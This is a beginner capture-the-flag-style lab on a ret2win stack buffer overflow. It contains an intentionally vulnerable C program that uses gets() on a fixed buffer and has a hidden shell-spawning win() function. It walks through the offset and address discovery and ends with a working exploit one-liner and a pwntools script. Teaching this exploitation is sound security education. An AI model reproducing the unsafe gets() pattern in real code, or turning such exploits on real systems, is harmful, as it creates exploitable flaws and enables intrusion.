# Lab 2: picoCTF-Style Buffer Overflow – ret2win Attack
**Time required:** 40–50 minutes
**Difficulty:** Beginner → Intermediate
**Goal:** Overflow a buffer and jump straight to the hidden `win()` function
**Author:** Latha Shree K P
---
## Where We Are in the Journey
| Lab | What you learned                          | What you can do now            |
|-----|-------------------------------------------|--------------------------------|
| 1   | Simple overflow → change a variable       | Spill into nearby memory       |
| 2   | Control the saved return address          | Jump anywhere → ret2win        |
Today we go from “spilling water” to “telling the program to go to the secret room”.
---
## Section 1: The Vulnerable Program
### Source code (`vuln.c`)
```c
#include <stdio.h>
#include <stdlib.h>
void win() {
    puts("Congratulations! You redirected execution to win()");
    puts("This is a classic ret2win attack.");
    system("/bin/sh");
}
void vulnerable() {
    char buffer[32];
    puts("What's your name?");
    gets(buffer);
    printf("Hello, %s!\n", buffer);
}
int main() {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    puts("Welcome to picoCTF-style Buffer Overflow 1");
    vulnerable();
    puts("Exiting normally...");
    return 0;
}
Compiled with
gcc -m32 -fno-stack-protector -no-pie -w -o vuln vuln.c
Section 2: Stack Layout
Higher memory addresses
┌────────────────────┐
│ saved EBP (4 B)    │
├────────────────────┤
│ saved EIP ←←←←←←←┤ ← we overwrite this!
├────────────────────┤
│ buffer[31]         │
│ ...                │
│ buffer[0] (32 B)   │
└────────────────────┘
Lower memory addresses
We need exactly 44 bytes to reach saved EIP.
Section 3: Find the Offset
Bashpython3 -c "from pwn import *; print(cyclic(100))" | ./vuln
# crashes → EIP = 0x61616168 (example)
python3 -c "from pwn import *; print(cyclic_find(0x61616168))"
# → 44
Offset = 44 bytes
Section 4: Address of win()
Bashgdb -q vuln
(gdb) p win
$1 = 0x8049186 <win>
win() = 0x8049186 → little-endian \x86\x91\x04\x08
Section 5: The Exploit
Payload = [44 × "A"] + [\x86\x91\x04\x08]
One-liner
Bash(python3 -c "print('A'*44 + '\x86\x91\x04\x08')"; cat) | ./vuln
Full exploit.py
Python#!/usr/bin/env python3
from pwn import *
p = process("./vuln")
win_addr = 0x8049186
payload  = b"A" * 44
payload += p32(win_addr)
p.sendline(payload)
p.interactive()
Section 6: What Happens
vulnerable() called → normal stack
we send 48 bytes → saved EIP = 0x8049186
vulnerable() returns → CPU jumps to win()
win() runs → prints message + drops shell
Section 7: Troubleshooting
Problem                    Fix
Immediate segfault         redo cyclic_find
Wrong EIP value            re-run p win in gdb
Address changes every run  recompile with -no-pie
No output / hangs          check binary name and folder
Section 8: Mini Exercises
• Change win() message → recompile → update address → exploit again
• Remove system("/bin/sh") → prove you still reach win()
• Change buffer size to 16 → recalculate offset from scratch
Quick Reference
Bash# offset
python3 -c "from pwn import *; print(cyclic_find(0x61616168))" → 44
# win address
gdb -q vuln -ex "p win" -ex quit → 0x8049186
# one-liner
(python3 -c "print('A'*44 + '\x86\x91\x04\x08')"; cat) | ./vuln
# script
python3 exploit.py

You just completed a real picoCTF-style ret2win!
Happy hacking!